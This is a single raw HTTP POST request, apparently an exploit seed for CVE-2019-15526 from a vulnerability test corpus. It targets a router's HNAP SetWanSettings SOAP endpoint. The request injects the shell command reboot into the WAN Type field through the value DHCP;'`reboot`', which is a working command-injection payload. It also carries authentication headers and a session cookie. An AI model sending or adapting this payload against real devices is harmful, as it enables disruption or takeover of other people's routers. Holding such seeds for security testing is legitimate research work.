Vulnerabilities/CVE-2019-15526/BM-2024-00083-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.33.166:33382
Content-Length: 1033
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: DF107EA29B2FB559FDA1783A4646F782 1730701956
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.33.166:33382
Referer: http://192.168.33.166:33382/Home.html
Accept-Encoding: gzip, deflate, br
Cookie: uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1
Connection: keep-alive

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetWanSettings xmlns="http://purenetworks.com/HNAP1/"><Type>DHCP;'`reboot`'</Type><PppoeType><Username></Username><Password></Password><MaxIdleTime>0</MaxIdleTime></PppoeType><MTU>1400</MTU><HostName></HostName><ServiceName></ServiceName><AutoReconnect>false</AutoReconnect><IPAddress></IPAddress><SubnetMask></SubnetMask><Gateway></Gateway><DnsManual>false</DnsManual><MacCloneEnable>false</MacCloneEnable><CloneMacAddress></CloneMacAddress><MacCloneType></MacCloneType><WanSpeed>Auto</WanSpeed><WanDuplex>Auto</WanDuplex><ConfigDNS><Primary></Primary><Secondary></Secondary></ConfigDNS><MacAddress></MacAddress><VPNServerIPAddress></VPNServerIPAddress><VPNLocalIPAddress></VPNLocalIPAddress><VPNLocalSubnetMask></VPNLocalSubnetMask><VPNLocalGateway></VPNLocalGateway></SetWanSettings></soap:Body></soap:Envelope>